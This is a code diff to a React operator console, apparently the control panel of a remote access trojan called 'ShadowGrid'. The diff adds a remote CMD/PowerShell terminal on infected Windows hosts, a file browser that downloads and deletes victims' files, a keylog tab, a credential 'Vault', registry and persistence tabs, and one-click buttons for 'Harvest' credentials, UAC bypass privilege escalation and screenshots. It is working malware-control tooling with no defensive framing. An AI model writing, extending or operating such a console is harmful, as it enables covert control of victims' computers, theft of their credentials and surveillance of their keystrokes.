@@ -3,6 +3,8 @@ import { api } from '../api';
 import Modal from '../components/Modal';
 import ConfirmModal from '../components/ConfirmModal';
 
+/* ========== HELPERS ========== */
+
 function countryFlag(code) {
   if (!code || code.length !== 2) return '';
   return String.fromCodePoint(
@@ -10,215 +12,334 @@ function countryFlag(code) {
   );
 }
 
-const TABS = ['Terminal','Storage','Tasks','Processes','Display','Input Log','Vault','Config Store','Services','Network','Settings'];
+const timeSince = (d) => {
+  if (!d) return '-';
+  const s = Math.floor((Date.now() - new Date(d).getTime()) / 1000);
+  if (s < 60) return s + 's ago';
+  if (s < 3600) return Math.floor(s / 60) + 'm ago';
+  return Math.floor(s / 3600) + 'h ago';
+};
+
+/** Send a task and poll for its result. Returns parsed output or null on timeout. */
+async function sendAndPoll(agentId, taskType, args, onResult, timeoutMs = 60000) {
+  try {
+    const res = await api.createTask(agentId, taskType, args);
+    const taskId = res.id;
+    const maxAttempts = Math.ceil(timeoutMs / 2000);
+    for (let i = 0; i < maxAttempts; i++) {
+      await new Promise(r => setTimeout(r, 2000));
+      const results = await api.getAgentResults(agentId);
+      const result = results.find(r => r.task_id === taskId);
+      if (result) {
+        try {
+          const parsed = JSON.parse(result.output);
+          onResult(parsed);
+        } catch {
+          onResult(result.output);
+        }
+        return;
+      }
+    }
+    onResult(null); // timeout
+  } catch (e) {
+    onResult(null);
+  }
+}
+
+/* ========== CONTEXT MENU ========== */
+
+function ContextMenu({ x, y, items, onClose }) {
+  const ref = useRef(null);
+  useEffect(() => {
+    const handler = (e) => {
+      if (ref.current && !ref.current.contains(e.target)) onClose();
+    };
+    document.addEventListener('mousedown', handler);
+    return () => document.removeEventListener('mousedown', handler);
+  }, [onClose]);
+
+  if (!items || items.length === 0) return null;
+
+  const posX = Math.min(x, window.innerWidth - 220);
+  const posY = Math.min(y, window.innerHeight - items.length * 36);
+
+  return (
+    <div ref={ref} style={{
+      position: 'fixed', left: posX, top: posY, zIndex: 99999,
+      background: '#1a1c20', border: '1px solid rgba(255,255,255,0.1)',
+      minWidth: 200, padding: '4px 0', fontFamily: 'var(--font-mono)', fontSize: 12,
+    }}>
+      {items.map((item, i) =>
+        item.separator ? (
+          <div key={i} style={{ height: 1, background: 'rgba(255,255,255,0.1)', margin: '4px 0' }} />
+        ) : (
+          <div key={i} onClick={() => { item.onClick?.(); onClose(); }} style={{
+            padding: '7px 16px', color: item.danger ? 'var(--red)' : 'rgba(255,255,255,0.7)',
+            cursor: 'pointer', display: 'flex', alignItems: 'center', gap: 10,
+          }} onMouseEnter={e => e.currentTarget.style.background = item.danger ? 'rgba(255,68,68,0.1)' : 'rgba(255,255,255,0.05)'}
+             onMouseLeave={e => e.currentTarget.style.background = 'transparent'}>
+            {item.icon && <span style={{ width: 16, textAlign: 'center', fontSize: 13 }}>{item.icon}</span>}
+            <span>{item.label}</span>
+            {item.shortcut && <span style={{ marginLeft: 'auto', color: 'rgba(255,255,255,0.3)', fontSize: 10 }}>{item.shortcut}</span>}
+          </div>
+        )
+      )}
+    </div>
+  );
+}
+
+/* ========== TOAST ========== */
+
+let _toastTimeout;
+function useToast() {
+  const [msg, setMsg] = useState(null);
+  const show = useCallback((text) => {
+    setMsg(text);
+    clearTimeout(_toastTimeout);
+    _toastTimeout = setTimeout(() => setMsg(null), 2000);
+  }, []);
+  return [msg, show];
+}
+
+function Toast({ msg }) {
+  if (!msg) return null;
+  return (
+    <div style={{
+      position: 'fixed', bottom: 20, right: 20, background: '#1a1c20',
+      border: '1px solid var(--green)', color: 'var(--green)',
+      padding: '10px 20px', fontFamily: 'var(--font-mono)', fontSize: 12,
+      zIndex: 999999, transition: 'all .3s',
+    }}>{msg}</div>
+  );
+}
+
+/* ========== MAIN MODAL ========== */
+
+const TABS = [
+  { key: 'terminal', label: '⌘ Terminal' },
+  { key: 'files', label: '📁 Files' },
+  { key: 'processes', label: '⚙ Processes' },
+  { key: 'display', label: '🖥 Display' },
+  { key: 'keylog', label: '⌨ Input Log' },
+  { key: 'vault', label: '🔑 Vault' },
+  { key: 'registry', label: '🗂 Registry' },
+  { key: 'persistence', label: '📌 Persistence' },
+  { key: 'network', label: '🌐 Network' },
+  { key: 'settings', label: '⚙ Settings' },
+];
 
 export default function AgentModal({ agent, onClose }) {
-  const [tab, setTab] = useState(0);
-  const [tasks, setTasks] = useState([]);
-  const [results, setResults] = useState([]);
+  const [tab, setTab] = useState('terminal');
   const [creds, setCreds] = useState([]);
-  const [sleep, setSleep] = useState(agent.sleep_seconds || 5);
-  const [jitter, setJitter] = useState(agent.jitter_percent || 20);
+  const [toastMsg, showToast] = useToast();
 
   useEffect(() => {
-    api.getAgentTasks(agent.id).then(setTasks).catch(() => {});
-    api.getAgentResults(agent.id).then(setResults).catch(() => {});
     api.getCredentials('agent_id=' + agent.id).then(setCreds).catch(() => {});
   }, [agent.id]);
 
-  // Poll for new results every 3 seconds when terminal is active
-  useEffect(() => {
-    const interval = setInterval(() => {
-      api.getAgentResults(agent.id).then(setResults).catch(() => {});
-    }, 3000);
-    return () => clearInterval(interval);
-  }, [agent.id]);
-
-  const statusColor = agent.status === 'dead' ? 'red' : agent.status === 'dormant' ? 'yellow' : 'green';
-
-  const timeSince = (d) => {
-    if (!d) return '-';
-    const s = Math.floor((Date.now() - new Date(d).getTime()) / 1000);
-    if (s < 60) return s + 's ago';
-    if (s < 3600) return Math.floor(s / 60) + 'm ago';
-    return Math.floor(s / 3600) + 'h ago';
-  };
+  const statusColor = agent.status === 'dead' ? 'var(--red)' : agent.status === 'dormant' ? 'var(--yellow)' : 'var(--green)';
 
   return (
     <Modal onClose={onClose}>
       {/* HEADER */}
-      <div className="modal-header">
-        <div className="modal-header-left">
-          <span className={`status-dot ${statusColor}`} />
-          <span>{agent.id?.substring(0, 10).toUpperCase()}</span>
-          <span style={{ color: 'var(--text-sec)' }}>{agent.hostname}</span>
-          <span className="badge-admin" style={{ borderColor: `var(--${statusColor})`, color: `var(--${statusColor})` }}>
-            {agent.status?.toUpperCase()}
-          </span>
+      <div style={{
+        display: 'flex', alignItems: 'center', justifyContent: 'space-between',
+        padding: '10px 16px', background: '#1f2228', borderBottom: '1px solid var(--border)', flexShrink: 0,
+      }}>
+        <div style={{ display: 'flex', alignItems: 'center', gap: 12, fontSize: 12, fontFamily: 'var(--font-mono)' }}>
+          <span style={{ width: 8, height: 8, background: statusColor, display: 'inline-block', animation: agent.status === 'active' ? 'pulse 2s infinite' : 'none' }} />
+          <span style={{ fontSize: 16 }}>{countryFlag(agent.country)}</span>
+          <span style={{ fontWeight: 600 }}>{agent.hostname || agent.id?.substring(0, 10).toUpperCase()}</span>
+          <span style={{ color: 'rgba(255,255,255,0.3)' }}>│</span>
+          <span style={{ color: 'rgba(255,255,255,0.5)' }}>USER</span>
+          <span>{agent.username || '-'}</span>
+          <span style={{ color: 'rgba(255,255,255,0.3)' }}>│</span>
+          <span style={{ color: 'rgba(255,255,255,0.5)' }}>OS</span>
+          <span>{agent.os || '-'}</span>
+          <span style={{ color: 'rgba(255,255,255,0.3)' }}>│</span>
+          <span style={{ color: 'rgba(255,255,255,0.5)' }}>IP</span>
+          <span>{agent.ip_internal || '-'}</span>
+          <span style={{ color: 'rgba(255,255,255,0.3)' }}>│</span>
+          <span style={{ color: 'rgba(255,255,255,0.5)' }}>EXT</span>
+          <span>{agent.ip_external || '-'}</span>
+          {agent.isp && <>
+            <span style={{ color: 'rgba(255,255,255,0.3)' }}>│</span>
+            <span style={{ color: 'rgba(255,255,255,0.5)' }}>ISP</span>
+            <span>{agent.isp}</span>
+          </>}
+          <span style={{ color: 'rgba(255,255,255,0.3)' }}>│</span>
+          <span style={{ color: 'rgba(255,255,255,0.5)' }}>LAST</span>
+          <span style={{ color: statusColor }}>{timeSince(agent.last_seen)}</span>
         </div>
-        <div className="modal-header-center">
-          <span>{agent.os} • {agent.arch}</span>
-        </div>
-        <div className="modal-header-right">
-          <span>{countryFlag(agent.country)} {agent.country}{agent.city ? ' • ' + agent.city : ''}{agent.isp ? ' • ' + agent.isp : ''}</span>
-          <span>{agent.ip_external || agent.ip_internal}</span>
-          <span style={{ color: `var(--${statusColor})` }}>Last seen: {timeSince(agent.last_seen)}</span>
-          <button className="modal-close" onClick={onClose}>✕</button>
+        <div style={{ display: 'flex', gap: 6 }}>
+          <HeaderBtn label="⬜ Screenshot" onClick={() => { api.createTask(agent.id, 'display_capture', {}); showToast('📸 Screenshot captured'); }} />
+          <HeaderBtn label="⚷ Harvest" cls="harvest" onClick={() => { api.createTask(agent.id, 'vault_reader', {}); showToast('🔑 Harvesting credentials...'); }} />
+          <HeaderBtn label="↑ Escalate" cls="escalate" onClick={() => { api.createTask(agent.id, 'uac_bypass', {}); showToast('⚡ Attempting privilege escalation...'); }} />
+          <HeaderBtn label="✕ Kill" cls="kill" onClick={() => { api.createTask(agent.id, 'cleanup', {}); showToast('☠ Agent terminated'); }} />
+          <button onClick={onClose} style={{
+            background: 'none', border: '1px solid var(--border)', color: 'rgba(255,255,255,0.5)',
+            fontSize: 16, width: 30, height: 30, display: 'flex', alignItems: 'center', justifyContent: 'center',
+            cursor: 'pointer', marginLeft: 10, fontFamily: 'var(--font-mono)',
+          }}>✕</button>
         </div>
       </div>
 
-      {/* TABS */}
-      <div className="modal-tabs">
-        {TABS.map((t, i) => (
-          <button key={i} className={`modal-tab ${tab === i ? 'active' : ''}`} onClick={() => setTab(i)}>{t}</button>
+      {/* TAB BAR */}
+      <div style={{
+        display: 'flex', borderBottom: '1px solid var(--border)', background: '#1f2228',
+        flexShrink: 0, overflowX: 'auto',
+      }}>
+        {TABS.map(t => (
+          <div key={t.key} onClick={() => setTab(t.key)} style={{
+            padding: '9px 16px', fontSize: 11, cursor: 'pointer',
+            borderBottom: tab === t.key ? '2px solid var(--green)' : '2px solid transparent',
+            color: tab === t.key ? 'var(--green)' : 'rgba(255,255,255,0.5)',
+            whiteSpace: 'nowrap', textTransform: 'uppercase', letterSpacing: 0.5,
+            fontFamily: 'var(--font-mono)', transition: 'all .15s',
+          }}>{t.label}</div>
         ))}
       </div>
 
-      {/* BODY */}
-      <div className="modal-body">
-        {/* TAB 0: TERMINAL */}
-        {tab === 0 && <TerminalTab agent={agent} results={results} />}
-
-        {/* TAB 1: STORAGE */}
-        {tab === 1 && <StorageTab agentId={agent.id} />}
-
-        {/* TAB 2: TASKS */}
-        {tab === 2 && <TasksTab tasks={tasks} results={results} />}
-
-        {/* TAB 3: PROCESSES */}
-        {tab === 3 && <ProcessesTab agentId={agent.id} />}
-
-        {/* TAB 4: DISPLAY */}
-        {tab === 4 && <DisplayTab agentId={agent.id} />}
-
-        {/* TAB 5: INPUT LOG */}
-        {tab === 5 && <InputLogTab agentId={agent.id} />}
-
-        {/* TAB 6: VAULT */}
-        {tab === 6 && <VaultTab creds={creds} agentId={agent.id} />}
-
-        {/* TAB 7: CONFIG STORE */}
-        {tab === 7 && <ConfigStoreTab agentId={agent.id} />}
-
-        {/* TAB 8: SERVICES */}
-        {tab === 8 && <ServicesTab agentId={agent.id} />}
-
-        {/* TAB 9: NETWORK */}
-        {tab === 9 && <NetworkTab agentId={agent.id} />}
-
-        {/* TAB 10: SETTINGS */}
-        {tab === 10 && <AgentSettingsTab agentId={agent.id} sleep={sleep} setSleep={setSleep} jitter={jitter} setJitter={setJitter} />}
+      {/* TAB CONTENT */}
+      <div style={{ flex: 1, overflow: 'hidden', display: 'flex', flexDirection: 'column' }}>
+        {tab === 'terminal' && <TerminalTab agent={agent} showToast={showToast} />}
+        {tab === 'files' && <FilesTab agentId={agent.id} showToast={showToast} />}
+        {tab === 'processes' && <ProcessesTab agentId={agent.id} showToast={showToast} />}
+        {tab === 'display' && <DisplayTab agentId={agent.id} showToast={showToast} />}
+        {tab === 'keylog' && <InputLogTab agentId={agent.id} showToast={showToast} />}
+        {tab === 'vault' && <VaultTab creds={creds} agentId={agent.id} showToast={showToast} />}
+        {tab === 'registry' && <RegistryTab agentId={agent.id} showToast={showToast} />}
+        {tab === 'persistence' && <PersistenceTab agentId={agent.id} showToast={showToast} />}
+        {tab === 'network' && <NetworkTab agentId={agent.id} showToast={showToast} />}
+        {tab === 'settings' && <SettingsTab agentId={agent.id} agent={agent} showToast={showToast} />}
       </div>
+
+      <Toast msg={toastMsg} />
     </Modal>
   );
 }
 
+function HeaderBtn({ label, cls, onClick }) {
+  const colors = {
+    harvest: { border: 'rgba(0,255,136,0.3)', color: 'var(--green)', hover: 'rgba(0,255,136,0.1)' },
+    escalate: { border: 'rgba(255,170,0,0.3)', color: 'var(--yellow)', hover: 'rgba(255,170,0,0.1)' },
+    kill: { border: 'rgba(255,68,68,0.3)', color: 'var(--red)', hover: 'rgba(255,68,68,0.1)' },
+  };
+  const c = colors[cls] || { border: 'var(--border)', color: 'rgba(255,255,255,0.7)', hover: 'rgba(255,255,255,0.1)' };
+  return (
+    <button onClick={onClick} style={{
+      background: 'rgba(255,255,255,0.05)', border: `1px solid ${c.border}`, color: c.color,
+      fontFamily: 'var(--font-mono)', fontSize: 11, padding: '5px 12px', cursor: 'pointer',
+    }} onMouseEnter={e => e.currentTarget.style.background = c.hover}
+       onMouseLeave={e => e.currentTarget.style.background = 'rgba(255,255,255,0.05)'}>{label}</button>
+  );
+}
+
+/* ===== STYLES SHARED ===== */
+const S = {
+  toolbar: { display: 'flex', alignItems: 'center', gap: 8, padding: '8px 12px', borderBottom: '1px solid var(--border)', background: '#1f2228', flexShrink: 0, fontFamily: 'var(--font-mono)' },
+  toolInput: { background: 'rgba(255,255,255,0.05)', border: '1px solid var(--border)', color: '#fff', fontFamily: 'var(--font-mono)', fontSize: 11, padding: '5px 10px', outline: 'none', minWidth: 180 },
+  toolBtn: { background: 'rgba(255,255,255,0.05)', border: '1px solid var(--border)', color: 'rgba(255,255,255,0.7)', fontFamily: 'var(--font-mono)', fontSize: 11, padding: '5px 12px', cursor: 'pointer', whiteSpace: 'nowrap' },
+  btnSuccess: { background: 'rgba(0,255,136,0.1)', borderColor: 'rgba(0,255,136,0.3)', color: 'var(--green)' },
+  btnDanger: { background: 'rgba(255,68,68,0.1)', borderColor: 'rgba(255,68,68,0.3)', color: 'var(--red)' },
+  btnWarn: { background: 'rgba(255,170,0,0.1)', borderColor: 'rgba(255,170,0,0.3)', color: 'var(--yellow)' },
+  th: { background: '#1f2228', padding: '7px 10px', textAlign: 'left', color: 'rgba(255,255,255,0.5)', fontWeight: 500, borderBottom: '1px solid var(--border)', cursor: 'pointer', whiteSpace: 'nowrap', userSelect: 'none', fontSize: 11, textTransform: 'uppercase', letterSpacing: '0.3px', fontFamily: 'var(--font-mono)' },
+  td: { padding: '6px 10px', borderBottom: '1px solid rgba(255,255,255,0.04)', whiteSpace: 'nowrap', fontSize: 12, fontFamily: 'var(--font-mono)' },
+  splitPanel: { display: 'flex', flex: 1, overflow: 'hidden' },
+  splitLeft: { width: 260, minWidth: 200, borderRight: '1px solid var(--border)', overflowY: 'auto', background: '#15171b' },
+  splitRight: { flex: 1, overflowY: 'auto', display: 'flex', flexDirection: 'column' },
+  sectionTitle: { fontSize: 12, color: 'rgba(255,255,255,0.5)', textTransform: 'uppercase', letterSpacing: 0.5, padding: '12px 12px 8px', borderBottom: '1px solid var(--border)', display: 'flex', alignItems: 'center', justifyContent: 'space-between', fontFamily: 'var(--font-mono)' },
+  tag: (color) => ({ display: 'inline-block', padding: '1px 6px', fontSize: 10, border: `1px solid ${color}30`, color: color, background: `${color}14`, fontFamily: 'var(--font-mono)' }),
+};
+
 /* ========== TERMINAL TAB ========== */
-function TerminalTab({ agent, results }) {
+function TerminalTab({ agent, showToast }) {
   const [history, setHistory] = useState([]);
   const [input, setInput] = useState('');
   const [working, setWorking] = useState(false);
-  const [pendingTaskId, setPendingTaskId] = useState(null);
+  const [shell, setShell] = useState('cmd');
   const [cmdHistory, setCmdHistory] = useState([]);
   const [historyIdx, setHistoryIdx] = useState(-1);
   const termRef = useRef(null);
   const inputRef = useRef(null);
 
-  // Watch for results matching our pending task
-  useEffect(() => {
-    if (pendingTaskId && results) {
-      const result = results.find(r => r.task_id === pendingTaskId);
-      if (result) {
-        setHistory(prev => [...prev, { type: 'output', text: result.output }]);
-        setWorking(false);
-        setPendingTaskId(null);
-      }
-    }
-  }, [results, pendingTaskId]);
-
   const sendCommand = async (cmd) => {
-    if (!cmd.trim()) return;
+    if (!cmd.trim() || working) return;
     setHistory(prev => [...prev, { type: 'input', text: cmd }]);
     setCmdHistory(prev => [cmd, ...prev]);
     setHistoryIdx(-1);
     setInput('');
     setWorking(true);
 
-    try {
-      const res = await api.createTask(agent.id, 'terminal', { cmd });
-      setPendingTaskId(res.id);
-    } catch (e) {
-      setHistory(prev => [...prev, { type: 'error', text: e.message }]);
+    sendAndPoll(agent.id, 'terminal', { cmd }, (result) => {
+      if (result !== null) {
+        setHistory(prev => [...prev, { type: 'output', text: typeof result === 'string' ? result : JSON.stringify(result, null, 2) }]);
+      } else {
+        setHistory(prev => [...prev, { type: 'error', text: 'Timeout: no response from agent' }]);
+      }
       setWorking(false);
-    }
+    });
   };
 
   const handleKeyDown = (e) => {
-    if (e.key === 'Enter') {
-      e.preventDefault();
-      sendCommand(input);
-    } else if (e.key === 'ArrowUp') {
+    if (e.key === 'Enter') { e.preventDefault(); sendCommand(input); }
+    else if (e.key === 'ArrowUp') {
       e.preventDefault();
       if (cmdHistory.length > 0) {
-        const newIdx = Math.min(historyIdx + 1, cmdHistory.length - 1);
-        setHistoryIdx(newIdx);
-        setInput(cmdHistory[newIdx]);
+        const idx = Math.min(historyIdx + 1, cmdHistory.length - 1);
+        setHistoryIdx(idx);
+        setInput(cmdHistory[idx]);
       }
     } else if (e.key === 'ArrowDown') {
       e.preventDefault();
-      if (historyIdx > 0) {
-        const newIdx = historyIdx - 1;
-        setHistoryIdx(newIdx);
-        setInput(cmdHistory[newIdx]);
-      } else {
-        setHistoryIdx(-1);
-        setInput('');
-      }
+      if (historyIdx > 0) { setHistoryIdx(historyIdx - 1); setInput(cmdHistory[historyIdx - 1]); }
+      else { setHistoryIdx(-1); setInput(''); }
     }
   };
 
-  useEffect(() => {
-    if (termRef.current) termRef.current.scrollTop = termRef.current.scrollHeight;
-  }, [history, working]);
+  useEffect(() => { termRef.current && (termRef.current.scrollTop = termRef.current.scrollHeight); }, [history, working]);
+  useEffect(() => { inputRef.current?.focus(); }, [working]);
 
-  useEffect(() => {
-    inputRef.current?.focus();
-  }, [working]);
+  const prompt = shell === 'ps' ? 'PS> ' : 'C:\\> ';
 
   return (
-    <div style={{ height: '100%', display: 'flex', flexDirection: 'column' }}>
-      <div ref={termRef} onClick={() => inputRef.current?.focus()} style={{
-        flex: 1, background: '#0a0c10', padding: 12, fontFamily: 'var(--font-mono)',
-        fontSize: 12, color: '#c8c8c8', overflow: 'auto', cursor: 'text',
-        minHeight: 400,
-      }}>
-        <div style={{ color: 'var(--green)', marginBottom: 8 }}>
-          [ShadowGrid] Connected to {agent.hostname || agent.id.substring(0,8)} ({agent.os || 'unknown'})
-        </div>
-        {history.map((entry, i) => (
-          <div key={i} style={{ marginBottom: 2 }}>
-            {entry.type === 'input' && (
-              <span><span style={{ color: 'var(--green)' }}>{'>'} </span>{entry.text}</span>
-            )}
-            {entry.type === 'output' && (
-              <pre style={{ margin: 0, whiteSpace: 'pre-wrap', color: '#e0e0e0' }}>{entry.text}</pre>
-            )}
-            {entry.type === 'error' && (
-              <span style={{ color: 'var(--red)' }}>✕ {entry.text}</span>
-            )}
+    <div style={{ display: 'flex', flexDirection: 'column', flex: 1 }}>
+      <div style={S.toolbar}>
+        <span style={{ color: 'rgba(255,255,255,0.5)', fontSize: 11 }}>SHELL:</span>
+        <select value={shell} onChange={e => setShell(e.target.value)} style={{
+          background: '#15171b', border: '1px solid var(--border)', color: '#fff',
+          fontFamily: 'var(--font-mono)', fontSize: 11, padding: '4px 8px', outline: 'none',
+        }}>
+          <option value="cmd">CMD</option>
+          <option value="ps">PowerShell</option>
+        </select>
+        <button style={S.toolBtn} onClick={() => setHistory([])}>Clear</button>
+        <div style={{ flex: 1 }} />
+        <span style={{ color: 'rgba(255,255,255,0.3)', fontSize: 10 }}>Encoding: UTF-8</span>
+      </div>
+      <div style={{ flex: 1, display: 'flex', flexDirection: 'column', background: '#0a0c10', overflow: 'hidden' }}>
+        <div ref={termRef} onClick={() => inputRef.current?.focus()} style={{
+          flex: 1, overflowY: 'auto', padding: 12, fontSize: 12, lineHeight: 1.6, fontFamily: 'var(--font-mono)', cursor: 'text',
+        }}>
+          <div style={{ color: 'var(--green)', marginBottom: 8 }}>
+            [ShadowGrid] Connected to {agent.hostname || agent.id?.substring(0, 8)} ({agent.os || 'unknown'})
           </div>
-        ))}
-        {working && <div style={{ color: 'var(--yellow)' }}>⏳ executing...</div>}
-        <div style={{ display: 'flex', alignItems: 'center' }}>
-          <span style={{ color: 'var(--green)' }}>{'>'} </span>
+          {history.map((entry, i) => (
+            <div key={i} style={{ marginBottom: 2, whiteSpace: 'pre-wrap', wordBreak: 'break-all' }}>
+              {entry.type === 'input' && <><span style={{ color: 'var(--green)' }}>{prompt}</span><span style={{ color: '#fff' }}>{entry.text}</span></>}
+              {entry.type === 'output' && <span style={{ color: 'rgba(255,255,255,0.7)' }}>{entry.text}</span>}
+              {entry.type === 'error' && <span style={{ color: 'var(--red)' }}>{entry.text}</span>}
+            </div>
+          ))}
+          {working && <div style={{ color: 'var(--yellow)' }}>⏳ executing...</div>}
+        </div>
+        <div style={{ display: 'flex', alignItems: 'center', padding: '0 12px 12px 12px', background: '#0a0c10', gap: 0 }}>
+          <span style={{ color: 'var(--green)', fontSize: 12, whiteSpace: 'pre', fontFamily: 'var(--font-mono)' }}>{prompt}</span>
           <input ref={inputRef} value={input} onChange={e => setInput(e.target.value)}
-            onKeyDown={handleKeyDown} disabled={working}
-            autoFocus
-            spellCheck="false"
+            onKeyDown={handleKeyDown} disabled={working} autoFocus spellCheck="false"
             style={{
-              flex: 1, background: 'transparent', border: 'none', outline: 'none',
-              color: '#e0e0e0', fontFamily: 'var(--font-mono)', fontSize: 12,
-              padding: 0, margin: 0,
+              flex: 1, background: 'transparent', border: 'none', color: '#fff',
+              fontFamily: 'var(--font-mono)', fontSize: 12, outline: 'none', caretColor: 'var(--green)',
             }} />
         </div>
       </div>
@@ -226,61 +347,37 @@ function TerminalTab({ agent, results }) {
   );
 }
 
-/* ========== STORAGE TAB ========== */
-function StorageTab({ agentId }) {
+/* ========== FILES TAB (Split Panel) ========== */
+function FilesTab({ agentId, showToast }) {
   const [path, setPath] = useState(['C:']);
   const [files, setFiles] = useState([]);
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState(null);
-  const [pendingTaskId, setPendingTaskId] = useState(null);
+  const [ctx, setCtx] = useState(null);
+  const [selectedFile, setSelectedFile] = useState(null);
 
   const currentPath = path.join('\\');
 
-  // Poll for results when a task is pending
-  useEffect(() => {
-    if (!pendingTaskId) return;
-    const interval = setInterval(async () => {
-      try {
-        const results = await api.getAgentResults(agentId);
-        const result = results.find(r => r.task_id === pendingTaskId);
-        if (result) {
-          clearInterval(interval);
-          setPendingTaskId(null);
-          setLoading(false);
-          try {
-            const parsed = JSON.parse(result.output);
-            if (Array.isArray(parsed)) {
-              // Sort: directories first, then alphabetically
-              parsed.sort((a, b) => {
-                if (a.is_dir && !b.is_dir) return -1;
-                if (!a.is_dir && b.is_dir) return 1;
-                return a.name.localeCompare(b.name);
-              });
-              setFiles(parsed);
-              setError(null);
-            } else {
-              setError(result.output);
-            }
-          } catch {
-            setError(result.output);
-          }
-        }
-      } catch {}
-    }, 2000);
-    return () => clearInterval(interval);
-  }, [pendingTaskId, agentId]);
-
-  const loadFiles = async (targetPath) => {
+  const loadFiles = (targetPath) => {
+    const p = targetPath || currentPath;
     setLoading(true);
     setError(null);
     setFiles([]);
-    try {
-      const res = await api.createTask(agentId, 'storage_list', { path: targetPath || currentPath });
-      setPendingTaskId(res.id);
-    } catch (e) {
+    sendAndPoll(agentId, 'storage_list', { path: p }, (result) => {
       setLoading(false);
-      setError(e.message);
-    }
+      if (result && Array.isArray(result)) {
+        result.sort((a, b) => {
+          if (a.is_dir && !b.is_dir) return -1;
+          if (!a.is_dir && b.is_dir) return 1;
+          return a.name.localeCompare(b.name);
+        });
+        setFiles(result);
+      } else if (result) {
+        setError(typeof result === 'string' ? result : JSON.stringify(result));
+      } else {
+        setError('Timeout: no response from agent');
+      }
+    });
   };
 
   const navigateTo = (folder) => {
@@ -304,122 +401,133 @@ function StorageTab({ agentId }) {
   };
 
   const formatSize = (bytes) => {
-    if (bytes === 0) return '-';
+    if (!bytes || bytes === 0) return '-';
     if (bytes < 1024) return bytes + ' B';
     if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' KB';
     if (bytes < 1024 * 1024 * 1024) return (bytes / (1024 * 1024)).toFixed(1) + ' MB';
     return (bytes / (1024 * 1024 * 1024)).toFixed(1) + ' GB';
   };
 
-  const formatDate = (ts) => {
-    if (!ts) return '-';
-    return new Date(ts * 1000).toLocaleString();
-  };
+  const formatDate = (ts) => !ts ? '-' : new Date(ts * 1000).toLocaleString();
 
-  const downloadFile = async (fileName) => {
-    const filePath = currentPath + '\\' + fileName;
-    await api.createTask(agentId, 'storage_read', { path: filePath });
-  };
+  const fileContextItems = (file) => [
+    ...(file.is_dir ? [{ label: 'Open', icon: '📂', onClick: () => navigateTo(file.name) }] : [
+      { label: 'Download', icon: '⬇', shortcut: 'Ctrl+D', onClick: () => { api.createTask(agentId, 'storage_upload', { path: currentPath + '\\' + file.name }); showToast('⬇ Download queued'); } },
+    ]),
+    { separator: true },
+    { label: 'Copy Path', icon: '📋', onClick: () => { navigator.clipboard.writeText(currentPath + '\\' + file.name); showToast('📋 Path copied'); } },
+    { separator: true },
+    { label: 'Delete', icon: '🗑', danger: true, shortcut: 'Del', onClick: () => { api.createTask(agentId, 'storage_delete', { path: currentPath + '\\' + file.name }); showToast('🗑 Deleted'); } },
+  ];
 
   return (
-    <div style={{ padding: 16 }}>
-      <div className="breadcrumb" style={{ marginBottom: 8 }}>
+    <div style={{ display: 'flex', flexDirection: 'column', flex: 1 }}>
+      <div style={S.toolbar}>
+        <button style={{ ...S.toolBtn, ...S.btnSuccess }} onClick={() => showToast('📤 Upload not implemented yet')}>↑ Upload</button>
+        <button style={S.toolBtn} onClick={() => showToast('📁 New folder not implemented yet')}>+ New Folder</button>
+        <button style={S.toolBtn} onClick={() => loadFiles()} disabled={loading}>{loading ? '⏳...' : '↻ Refresh'}</button>
+        <div style={{ flex: 1 }} />
+      </div>
+      {/* Breadcrumb */}
+      <div style={{
+        display: 'flex', alignItems: 'center', gap: 4, padding: '8px 12px',
+        borderBottom: '1px solid var(--border)', fontSize: 12, background: '#1f2228', fontFamily: 'var(--font-mono)',
+      }}>
         {path.map((p, i) => (
-          <span key={i}>
-            <span style={{ cursor: 'pointer', color: 'var(--green)' }} onClick={() => navigateBreadcrumb(i)}>{p}</span>
-            {i < path.length - 1 && <span className="sep" style={{ margin: '0 4px', color: 'var(--text-muted)' }}>&gt;</span>}
-          </span>
+          <React.Fragment key={i}>
+            {i > 0 && <span style={{ color: 'rgba(255,255,255,0.3)', fontSize: 10 }}>›</span>}
+            <span
+              style={{ color: i === path.length - 1 ? 'var(--green)' : 'rgba(255,255,255,0.5)', cursor: 'pointer' }}
+              onClick={() => navigateBreadcrumb(i)}
+            >{p}</span>
+          </React.Fragment>
         ))}
       </div>
-      <div className="toolbar" style={{ marginBottom: 12, display: 'flex', gap: 8 }}>
-        <button className="btn btn-sm" onClick={navigateUp} disabled={path.length <= 1}>⬆ UP</button>
-        <button className="btn btn-sm" onClick={() => loadFiles()} disabled={loading}>
-          {loading ? '⏳ LOADING...' : '🔄 REFRESH'}
-        </button>
-      </div>
-      {error && <div style={{ color: 'var(--red)', fontFamily: 'var(--font-mono)', fontSize: 11, marginBottom: 8 }}>Error: {error}</div>}
-      <table>
-        <thead><tr><th>Name</th><th>Size</th><th>Type</th><th>Modified</th><th>Actions</th></tr></thead>
-        <tbody>
-          {files.length === 0 && !loading && (
-            <tr><td colSpan={5} style={{ color: 'var(--text-disabled)', textAlign: 'center' }}>
-              Click REFRESH to browse the agent filesystem
-            </td></tr>
-          )}
-          {loading && (
-            <tr><td colSpan={5} style={{ color: 'var(--yellow)', textAlign: 'center' }}>
-              ⏳ Waiting for agent response...
-            </td></tr>
-          )}
-          {files.map((f, i) => (
-            <tr key={i}>
-              <td style={{ color: f.is_dir ? 'var(--yellow)' : 'var(--text-sec)', cursor: f.is_dir ? 'pointer' : 'default' }}
-                  onClick={() => f.is_dir && navigateTo(f.name)}>
-                {f.is_dir ? '📁 ' : '📄 '}{f.name}
-              </td>
-              <td>{f.is_dir ? '-' : formatSize(f.size)}</td>
-              <td>{f.is_dir ? 'Folder' : 'File'}</td>
-              <td style={{ fontSize: 11 }}>{formatDate(f.modified)}</td>
-              <td>
-                {f.is_dir ? (
-                  <button className="btn btn-sm" onClick={() => navigateTo(f.name)}>OPEN</button>
-                ) : (
-                  <button className="btn btn-sm" onClick={() => downloadFile(f.name)}>DOWNLOAD</button>
+      {/* Split panel */}
+      <div style={S.splitPanel}>
+        <div style={S.splitLeft}>
+          <div style={{ padding: 8 }}>
+            <div style={{ color: 'rgba(255,255,255,0.5)', fontSize: 10, textTransform: 'uppercase', marginBottom: 8, fontFamily: 'var(--font-mono)' }}>Folder Tree</div>
+            <div onClick={navigateUp} style={{ padding: '4px 8px', cursor: path.length > 1 ? 'pointer' : 'default', color: path.length > 1 ? 'var(--green)' : 'rgba(255,255,255,0.3)', fontSize: 12, fontFamily: 'var(--font-mono)' }}>
+              📁 ..
